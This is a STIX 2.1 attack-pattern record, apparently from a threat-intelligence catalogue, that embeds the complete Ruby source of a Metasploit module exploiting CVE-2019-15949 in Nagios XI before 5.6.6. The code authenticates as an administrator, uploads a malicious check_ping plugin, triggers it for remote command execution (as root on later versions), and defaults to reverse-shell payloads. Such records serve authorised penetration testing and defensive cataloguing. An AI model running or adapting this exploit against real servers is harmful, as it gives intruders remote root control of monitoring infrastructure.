{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--68de1cf2-d76c-48b7-b2ee-7dcf829a2247",
    "created": "2024-08-14T17:01:38.26885Z",
    "modified": "2024-08-14T17:01:38.268855Z",
    "name": "Nagios XI Prior to 5.6.6 getprofile.sh Authenticated Remote Command Execution",
    "description": " This module exploits a vulnerability in the getprofile.sh script of Nagios XI prior to 5.6.6 in order to upload a malicious check_ping plugin and thereby execute arbitrary commands.  For Nagios XI 5.2.0-5.4.13, the commands are run as the nagios user. For versions 5.5.0-5.6.5 the commands are run as root. Note that versions prior to 5.2.0 will still be marked as being vulnerable however this module does not presently support exploiting these targets.  The module uploads a malicious check_ping plugin to the Nagios XI server via /admin/monitoringplugins.php and then executes this plugin by issuing a HTTP GET request to download a system profile from the server. For all supported targets except Linux (cmd), the module uses a command stager to write the exploit to the target via the malicious plugin. This may not work if Nagios XI is running in a restricted Unix environment so in that case the target must be set to Linux (cmd). The module then writes the payload to the malicious plugin while avoiding commands that may not be supported.  Valid credentials for a user with administrative privileges are required. This module was successfully tested on Nagios XI 5.3.0 and Nagios 5.6.5, both running on CentOS 7. For vulnerable versions before 5.5.0, it may take a significant amount of time for the payload to get back (up to 5 minutes). If exploitation fails against an older system it is recommended to increase the WfsDelay setting (default is 300 seconds). See the documentation for more information.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce.rb",
            "external_id": "nagios_xi_plugins_check_plugin_authenticated_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-15949"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/jakgibb/nagiosxi-root-rce-exploit#originalPHPexploit"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::NagiosXi\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Module::Deprecated\n  moved_from 'exploit/linux/http/nagios_xi_authenticated_rce'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Nagios XI Prior to 5.6.6 getprofile.sh Authenticated Remote Command Execution',\n        'Description' => %q{\n          This module exploits a vulnerability in the getprofile.sh script\n          of Nagios XI prior to 5.6.6 in order to upload a malicious check_ping\n          plugin and thereby execute arbitrary commands.\n\n          For Nagios XI 5.2.0-5.4.13, the commands are run as the nagios user.\n          For versions 5.5.0-5.6.5 the commands are run as root. Note that versions\n          prior to 5.2.0 will still be marked as being vulnerable however this\n          module does not presently support exploiting these targets.\n\n          The module uploads a malicious check_ping plugin to the Nagios XI server via\n          /admin/monitoringplugins.php and then executes this plugin by issuing\n          a HTTP GET request to download a system profile from the server.\n          For all supported targets except Linux (cmd), the module uses a command\n          stager to write the exploit to the target via the malicious plugin.\n          This may not work if Nagios XI is running in a restricted Unix environment,\n          so in that case the target must be set to Linux (cmd). The module then\n          writes the payload to the malicious plugin while avoiding commands\n          that may not be supported.\n\n          Valid credentials for a user with administrative privileges are\n          required. This module was successfully tested on Nagios XI 5.3.0 and\n          Nagios 5.6.5, both running on CentOS 7. For vulnerable versions before\n          5.5.0, it may take a significant amount of time for the payload to get\n          back (up to 5 minutes). If exploitation fails against an older system,\n          it is recommended to increase the WfsDelay setting (default is 300\n          seconds). See the documentation for more information.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Jak Gibb', # https://github.com/jakgibb/ - Discovery and exploit\n          'Erik Wynter' # @wyntererik - Metasploit\n        ],\n        'References' => [\n          ['CVE', '2019-15949'],\n          ['URL', 'https://github.com/jakgibb/nagiosxi-root-rce-exploit'] # original PHP exploit\n        ],\n        'Payload' => { 'BadChars' => \"\\x00\" },\n        'Targets' => [\n          [\n            'Linux (x86)', {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux',\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'Linux (x64)', {\n              'Arch' => ARCH_X64,\n              'Platform' => 'linux',\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'Linux (cmd)', {\n              'Arch' => ARCH_CMD,\n              'Platform' => 'unix',\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' },\n              'Payload' => {\n                'Append' => ' & disown', # the payload must be disowned after execution, otherwise cleanup fails\n                'BadChars' => '\"'\n              }\n            }\n          ]\n        ],\n        'Privileged' => true,\n        'DisclosureDate' => '2019-07-29',\n        'DefaultOptions' => { 'WfsDelay' => 300 }, # Necessary because the payload connects back with a significant delay. On versions older than 5.5.0 it takes especially long.\n        'DefaultTarget' => 1,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE, ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, CONFIG_CHANGES ],\n          'Reliability' => []\n        }\n      )\n    )\n    register_options [\n      OptString.new('USERNAME', [true, 'Username to authenticate with', 'nagiosadmin']),\n      OptString.new('PASSWORD', [true, 'Password to authenticate with', nil])\n    ]\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def finish_install\n    datastore['FINISH_INSTALL']\n  end\n\n  def check\n    # Use nagios_xi_login to try and authenticate. If authentication succeeds, nagios_xi_login returns\n    # an array containing the http response body of a get request to index.php and the session cookies\n    auth_result, err_msg, @auth_cookies, @version = authenticate(username, password, finish_install)\n\n    case auth_result\n    when AUTH_RESULTS[:connection_failed]\n      return CheckCode::Unknown(err_msg)\n    when AUTH_RESULTS[:unexpected_error], AUTH_RESULTS[:not_fully_installed], AUTH_RESULTS[:failed_to_handle_license_agreement], AUTH_RESULTS[:failed_to_extract_tokens], AUTH_RESULTS[:unable_to_obtain_version]\n      return CheckCode::Detected(err_msg)\n    when AUTH_RESULTS[:not_nagios_application]\n      return CheckCode::Safe(err_msg)\n    end\n\n    if @version < Rex::Version.new('5.6.6')\n      return CheckCode::Appears\n    end\n\n    return CheckCode::Safe\n  end\n\n  def grab_plugins_nsp\n    # visit the plugins page to grab the nsp token required for uploading the payload\n    res = send_request_cgi({\n      'uri' => @monitoring_plugins_url,\n      'method' => 'GET',\n      'cookie' => @auth_cookies\n    })\n\n    unless res\n      fail_with(Failure::Disconnected, \"Connection failed while trying to visit `#{@monitoring_plugins_url}`\")\n    end\n\n    unless res.code == 200 && res.body.include?('<title>Manage Plugins &middot; Nagios XI</title>')\n      fail_with(Failure::UnexpectedReply, \"Unexpected response received while trying to visit `#{@monitoring_plugins_url}`\")\n    end\n\n    @nsp = get_nsp(res)\n\n    if @nsp.blank?\n      fail_with(Failure::Unknown, 'Failed to obtain the nsp token required to upload the payload')\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    print_status(\"Uploading malicious 'check_ping' plugin...\")\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(Rex::Text.rand_text_numeric(8), nil, nil, 'form-data; name=\"upload\"')\n    post_data.add_part(@nsp, nil, nil, 'form-data; name=\"nsp\"')\n    post_data.add_part(Rex::Text.rand_text_numeric(8), nil, nil, 'form-data; name=\"MAX_FILE_SIZE\"')\n    post_data.add_part(cmd, 'text/plain', nil, 'form-data; name=\"uploadedfile\"; filename=\"check_ping\"')\n\n    # upload payload\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => @monitoring_plugins_url,\n      'cookie' => @auth_cookies,\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'data' => post_data.to_s\n    })\n\n    unless res\n      fail_with Failure::Unreachable, 'Upload failed'\n    end\n\n    unless res.code == 200 && res.body.include?('New plugin was installed successfully')\n      fail_with Failure::Unknown, 'Failed to upload plugin.'\n    end\n\n    @plugin_installed = true\n  end\n\n  # This request will timeout. It has to, for the exploit to work.\n  def execute_payload\n    print_status('Executing plugin...')\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'includes', 'components', 'profile', 'profile.php'),\n      'method' => 'GET',\n      'cookie' => @auth_cookies,\n      'vars_get' => { 'cmd' => 'download' }\n    }, 0)\n  end\n\n  def cleanup\n    return unless @plugin_installed\n\n    print_status(\"Deleting malicious 'check_ping' plugin...\")\n    res = send_request_cgi({\n      'uri' => @monitoring_plugins_url,\n      'method' => 'GET',\n      'cookie' => @auth_cookies,\n      'vars_get' => {\n        'delete' => 'check_ping',\n        'nsp' => @nsp\n      }\n    })\n\n    unless res\n      print_warning(\"Failed to delete the malicious 'check_ping' plugin: Connection failed. Manual cleanup is required.\")\n      return\n    end\n\n    unless res.code == 200 && res.body.include?('Plugin deleted')\n      print_warning(\"Failed to delete the malicious 'check_ping' plugin. Manual cleanup is required.\")\n      return\n    end\n\n    print_good('Plugin deleted.')\n  end\n\n  def exploit\n    unless @auth_cookies.present?\n      auth_result, err_msg, @auth_cookies, @version = authenticate(username, password, finish_install)\n      case auth_result\n      when AUTH_RESULTS[:connection_failed]\n        return CheckCode::Unknown(err_msg)\n      when AUTH_RESULTS[:unexpected_error], AUTH_RESULTS[:not_fully_installed], AUTH_RESULTS[:failed_to_handle_license_agreement], AUTH_RESULTS[:failed_to_extract_tokens], AUTH_RESULTS[:unable_to_obtain_version]\n        return CheckCode::Detected(err_msg)\n      when AUTH_RESULTS[:not_nagios_application]\n        return CheckCode::Safe(err_msg)\n      end\n    end\n\n    @monitoring_plugins_url = normalize_uri(target_uri.path, 'admin', 'monitoringplugins.php')\n    grab_plugins_nsp\n    wfsdelay = datastore['WfsDelay']\n\n    if @version < Rex::Version.new('5.2.0')\n      fail_with(Failure::NoTarget, \"Target is vulnerable but this module does not support exploiting NagiosXI #{@version} at this time.\")\n    end\n    if target.arch.first == ARCH_CMD\n      execute_command(payload.encoded)\n      message = \"Waiting up to #{wfsdelay} seconds for the payload to connect back...\"\n    else\n      execute_cmdstager(background: true)\n      message = \"Waiting up to #{wfsdelay} seconds for the plugin to request the final payload...\"\n    end\n    if @version >= Rex::Version.new('5.2.0') && @version < Rex::Version.new('5.5.0')\n      print_warning(\"For NagiosXi version #{@version} it may take serveral minutes for a session to open. If the module times out, try increasing the `WfsDelay` value.\")\n    end\n    print_good('Successfully uploaded plugin.')\n    execute_payload\n    print_status(message)\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-07-29",
    "x_mitre_platforms": [
        "unix'"
    ]
}